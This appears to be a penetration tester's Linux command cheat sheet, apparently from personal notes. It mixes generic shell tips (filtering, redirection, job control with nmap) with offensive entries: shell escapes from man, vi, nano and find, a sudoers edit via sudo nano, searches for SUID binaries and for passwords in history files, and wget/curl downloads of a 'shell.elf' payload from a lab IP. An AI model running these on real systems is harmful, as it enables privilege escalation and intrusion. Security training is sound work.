# Commands

## [GTFOBins](https://gtfobins.github.io/)

## <a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' target="blank">Linux PriEscal</a>

## Manual page

=== "man"

	Spawn shell

	In Manual page, we can execute `!/bin/bash` to spawn a shell.

	``` bash 
	man <key search>
	```

	``` bash
	man -k '^passwd$'
	```

## Terminal editor

=== "vi"

	``` bash
	vi -c ':!/bin/sh' /dev/null
	```

	``` bash
	vi
	:set shell=/bin/sh
	:shell
	```

=== "nano"

	``` bash
	nano
	^R^X
	reset; sh 1>&0 2>&0
	```

	``` bash
	sudo nano /var/opt/../../etc/sudoers
	```

## Finding

=== "finding files"

	``` bash
	find / -name "<name>"
	```

===	"history, bashrc, backup"

	``` bash
	find / -name *history* 2>/dev/null
	find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
	```

===	"Binaries That AutoElevate"

	``` bash
	find / -perm -u=s -type f 2>/dev/null
	```

=== "Spawn shell"

	``` bash
	find . -exec /bin/sh \;
	```

## Downloading

=== "wget"

	``` bash
	wget -O /tmp/shell http://192.168.110.131/shell.elf
	
	wget <uri> -P /path/to/
	```

=== "curl"

	``` bash
	curl -o /tmp/shell http://192.168.110.131/shell.elf
	```

=== "axel"

	``` bash
	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
	```

## Filter output 

=== "sed"

	``` bash
	sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //'
	```

=== "cut"

	``` bash
	echo "hacking, penetration testing and bug hunting"| cut -f 2 -d " "
	```

	``` bash
	cut -d ":" -f 1 /etc/passwd
	```

=== "awk"

	``` bash
	cat /etc/passwd | awk -F ":" '{print $1, ":", $7}' | grep "sh"
	```

=== "uniq -c"

	``` bash
	cat list.txt | sort | uniq -c | sort -r
	```

=== "grep"

	``` bash
	ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d' '
	```

	``` bash
	grep -v "Nmap"
	```

## Monitoring

=== "tail"

	``` bash
	sudo tail -f /var/log/apache2/access.log
	```

=== "watch"

	``` bash
	watch -n 1 date
	```

## Screenshot

=== "cutycapt"

	``` bash
	cutycapt --url=$ip --out=$ip.png
	```

## Redirect

=== "to a New File"

	``` bash
	ls > list.txt
	```

	``` bash
	cat list.txt
	Desktop
	Documents
	list.txt
	```

=== "to an Existing File"

	``` bash
	echo "Add new" >> list.txt
	```

=== "from a File"

	``` bash
	wc -m < list.txt
	```

=== "STDERR"

	``` bash
	find / -perm -u=s -type f 2>/dev/null
	```

## Processes

=== "Background a process"

	``` bash
	nmap -p- 127.0.0.1 &
	```

=== "Suspend the job"

	``` bash
	┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
	└─$ nmap -p- 192.168.11.131 -Pn

	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 20:52 EST
	^Z
	zsh: suspended  nmap -p- 192.168.11.131 -Pn
	┌──(Hades㉿192.168.11.130)-[0.7:11.4]~
	└─$ bg

	[1]  + continued  nmap -p- 192.168.11.131 -Pn
	```

=== "jobs and fg"

	``` bash
	┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
	└─$ jobs

	[1]  + running    nmap -p- 192.168.11.131 -Pn
	                                                                                                                                                                            
	┌──(Hades㉿192.168.11.130)-[0.8:11.4]~
	└─$ fg

	[1]  + running    nmap -p- 192.168.11.131 -Pn
	^C
	```

=== "ps and kill"

	``` bash
	ps -ef
	UID          PID    PPID  C STIME TTY          TIME CMD
	root           1       0  0 20:39 ?        00:00:02 /sbin/init splash
	<snip>
	kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
	kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
	kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
	kali        1673    1202  0 20:59 pts/0    00:00:00 ps -ef
	```

	``` bash
	ps -fC nmap
	UID          PID    PPID  C STIME TTY          TIME CMD
	kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
	kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
	kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
	```

	``` bash
	kill 1466                                                                                                                                                           2 ⚙
	                                                                                                                                                                            
	[2]  + terminated  nmap -p- 192.168.11.132 -Pn
	```